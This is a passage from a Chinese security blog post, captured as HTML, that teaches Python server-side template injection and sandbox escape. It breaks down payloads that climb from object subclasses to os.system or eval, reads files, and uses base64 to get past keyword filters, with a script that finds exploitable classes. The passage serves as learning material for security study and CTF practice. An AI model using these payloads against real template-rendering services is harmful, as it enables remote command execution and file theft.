&lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;__main__.Foo&apos;&gt;]</span><br></pre></td></tr></table></figure>
+<p><code>().__class__.__bases__[0].__subclasses__()[40]</code>没错就是要返回file对象</p>
+<blockquote>
+<p>需要提醒的是<code>__subclasses__()</code>方法返回的是一个列表</p>
+</blockquote>
+<p>至于为什么要返回file对象，其实这里主要是看我们自己的需要的。</p>
+<p>所以这里的思路就是<br>1.通过<code>__class__</code>返回对应类型<br>2.通过<code>__bases__[0]</code>返回基类object<br>3.通过<code>__subclasses__()</code>方法找到我们需要的类</p>
+<p>刚刚在找资料的时候发现有一篇cl0und@Syclover师傅的也总结的很好,同样也可以看看</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a></p>
+</blockquote>
+<h4 id="1-5-Python-的内建函数"><a href="#1-5-Python-的内建函数" class="headerlink" title="1.5 Python 的内建函数"></a>1.5 Python 的内建函数</h4><p>在 Python 中，不引入直接使用的内置函数被成为 builtin 函数，<br>我们可以通过可以通过<code>dir __builtin__</code>来获取内置函数列表</p>
+<p>可以在python文档中查询python的内置方法</p>
+<blockquote>
+<p><a href="https://docs.python.org/2/library/stdtypes.html" target="_blank" rel="noopener">https://docs.python.org/2/library/stdtypes.html</a></p>
+</blockquote>
+<p>所以我们<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__enter__&apos;, &apos;__exit__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;close&apos;, &apos;closed&apos;, &apos;encoding&apos;, &apos;errors&apos;, &apos;fileno&apos;, &apos;flush&apos;, &apos;isatty&apos;, &apos;mode&apos;, &apos;name&apos;, &apos;newlines&apos;, &apos;next&apos;, &apos;read&apos;, &apos;readinto&apos;, &apos;readline&apos;, &apos;readlines&apos;, &apos;seek&apos;, &apos;softspace&apos;, &apos;tell&apos;, &apos;truncate&apos;, &apos;write&apos;, &apos;writelines&apos;, &apos;xreadlines&apos;]</span><br></pre></td></tr></table></figure>
+<p>那么那么其实<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure></p>
+<p>这个payload的意思是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure></p>
+<h4 id="常见payload2"><a href="#常见payload2" class="headerlink" title="常见payload2"></a>常见payload2</h4><p>我们再说说一些常见payload，虽然所从表面看我们大概能看出这些payload是用来干什么的但是一些细节可能还不是非常清楚</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&apos;os.system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3：</span><br><span class="line">&apos; &apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]</span><br></pre></td></tr></table></figure>
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><p>我们再讲下下面这个payload<br><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+<p>对于前面这一段应该都比较清楚了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71]</span><br><span class="line">&lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[76]</span><br><span class="line">&lt;class &apos;site.Quitter&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>又有一个疑惑出来了这个<code>&lt;class &#39;site._Printer&#39;&gt;</code> <code>&lt;class &#39;site.Quitter&#39;&gt;</code> 是什么东西？？？为什么要引用这个类呢？</p>
+<p>对于site.xxx我个人是理解为引入此模块中的一些附加的内置函数。</p>
+<p>其实这两段payload的目的是要引入import os模块</p>
+<h4 id="2-2-init-globals"><a href="#2-2-init-globals" class="headerlink" title="2.2 __init__.__globals__"></a>2.2 <code>__init__.__globals__</code></h4><p>那么<code>__init__.__globals__</code>这又是什么意思呢？</p>
+<p><code>__init__</code><br><code>__init__</code>为控制的是类生成的对象，举个例子更好理解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...     def __init__(self,name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         print &quot;init&quot;</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; if __name__ == &apos;__main__&apos;:</span><br><span class="line">...     user = User(&quot;test&quot;)</span><br><span class="line">... </span><br><span class="line">init</span><br></pre></td></tr></table></figure></p>
+<p><code>__globals__</code><br>函数名.<code>__globals__</code>对包含函数全局变量的字典进行引用，换句话说就是返回一个当前空间下能使用的模块，方法和变量的字典。</p>
+<p>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br></pre></td></tr></table></figure></p>
+<p>这段其实就是为了导入os模块，至于为什么要导入os模块，os 模块提供了非常丰富的方法用来处理文件和目录。所以os模块的重要性不言而喻了吧？</p>
+<p>至于如何搜索哪个site.xx中有os模块这里提供一个脚本</p>
+<p>我自己懒得重写了，来自bendawang师傅</p>
+<blockquote>
+<p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">cnt=0</span><br><span class="line">for item in [].__class__.__base__.__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        if &apos;os&apos; in item.__init__.__globals__:</span><br><span class="line">            print cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">    except:</span><br><span class="line">        print &quot;error&quot;,cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>
+<p>最终会发现只有site.Quitter，与site._Printer中有os模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71 &lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">76 &lt;class &apos;site.Quitter&apos;</span><br></pre></td></tr></table></figure></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>那么下面这个payload又是什么意思呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure></p>
+<p><code>&quot;&quot;.__class__.__mro__[-1]</code><br>毫无疑问也同样是要引入object对象</p>
+<p><code>__mro__</code></p>
+<p>递归地显示父类一直到 object<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>那么<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br><code>[&#39;__builtins__&#39;]</code> 是什么意思呢？？？<br>首先我们需要知道在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. import xxx</span><br><span class="line">2. from xxx import *</span><br><span class="line">3. __import__(&apos;xxx&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。<br>随着 builtin 这个模块自动引入到环境中。</p>
+<p>其实这里的<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br>与<code>__builtins__</code><br>其实还是有所区别的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &apos;__builtin__&apos; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;]</span><br><span class="line">&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt; ...........</span><br></pre></td></tr></table></figure>
+<p>对于<code>__builtins__</code>我们如何引入的模块呢？我们可以通过 dict 引入我们想要引入的模块。dict 的作用是列出一个模组  类  对象 下面 所有的属性和函数。<br>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;)</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当然我们可以通过换种方式来绕过限制，比如使用base64加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)</span><br><span class="line">&apos;X19pbXBvcnRfXw==&apos;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)</span><br><span class="line">&apos;b3M=&apos;</span><br></pre></td></tr></table></figure></p>
+<p>然后通过 dict 引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;))</span><br></pre></td></tr></table></figure></p>
+<p>毫无疑问<br><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></p>
+<p>这段其实作用和之前的是一样的</p>
+<p>这里我们同样讲解下eval<br>eval()函数十分强大，官方demo解释为：将字符串str当成有效的表达式来求值并返回计算结果。<br>但是如果滥用eval（）的话就会导致如果用户恶意输入，例如：</p>
+<p><code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code></p>
+<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>下一个payload</p>
+<p><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29]</span><br><span class="line">&lt;type &apos;builtin_function_or_method&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>对于<code>__call__</code><br>Python中的函数的引用可以作为输入传递到其他的函数/方法中，并在其中被执行。 </p>
+<p>这段的意思我认为是将(eval,’os.system(“ls”)’)作为内置函数执行</p>
+<p>大概把想讲的都讲了吧</p>
+<h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><h4 id="SSTI-in-Flask"><a href="#SSTI-in-Flask" class="headerlink" title="SSTI in Flask"></a>SSTI in Flask</h4><p>TokyoWesterns CTF 4th 2018 shrine<br>详解 </p>
+<blockquote>
+<p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p>
+</blockquote>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</a><br><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a><br><a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85672</a><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a><br><a href="https://juejin.im/post/5a0a458951882503dc5336c1" target="_blank" rel="noopener">https://juejin.im/post/5a0a458951882503dc5336c1</a><br><a href="https://www.evget.com/article/2015/8/28/22603.html" target="_blank" rel="noopener">https://www.evget.com/article/2015/8/28/22603.html</a><br><a href="https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</a><br><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/</a><br><a href="http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/" target="_blank" rel="noopener">http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/</a><br><a href="https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/</a><br><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a><br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/">Python服务端模板注入与沙盒逃逸的学习小结与实践</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 LJH 的个人博客">LJH</a></p>
+  <p><span>发布时间:</span>2019年03月20日 - 00:47</p>
+  <p><span>最后更新:</span>2019年03月20日 - 00:49</p>
+  <p><span>原始链接:</span><a href="/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/" title="Python服务端模板注入与沙盒逃逸的学习小结与实践">https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+     
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------END-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/模板注入/" rel="tag"><i class="fa fa-tag"></i> 模板注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/20/HCTF 2017 Deserted place(SOME攻击)/" rel="next" title="HCTF 2017 Deserted place(SOME攻击)">
+                <i class="fa fa-chevron-left"></i> HCTF 2017 Deserted place(SOME攻击)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MjUxOC8xOTA2NQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="LJH">
+            
+              <p class="site-author-name" itemprop="name">LJH</p>
+              <p class="site-description motion-element" itemprop="description">一只web狗</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/MuseLJH" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1049135835@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/MuseLJHX" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端模板注入"><span class="nav-number">2.1.</span> <span class="nav-text">服务端模板注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端模板注入漏洞探测"><span class="nav-number">2.2.</span> <span class="nav-text">服务端模板注入漏洞探测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么模板注入可以使用沙盒绕过"><span class="nav-number">3.</span> <span class="nav-text">为什么模板注入可以使用沙盒绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例题1"><span class="nav-number">3.1.</span> <span class="nav-text">例题1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI-in-Tornado"><span class="nav-number">3.1.1.</span> <span class="nav-text">SSTI in Tornado</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#沙盒技术"><span class="nav-number">3.2.</span> <span class="nav-text">沙盒技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python沙盒逃逸概述"><span class="nav-number">3.3.</span> <span class="nav-text">python沙盒逃逸概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#沙盒逃逸"><span class="nav-number">3.4.</span> <span class="nav-text">沙盒逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见-payload1"><span class="nav-number">3.4.1.</span> <span class="nav-text">常见 payload1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-xxx"><span class="nav-number">3.4.2.</span> <span 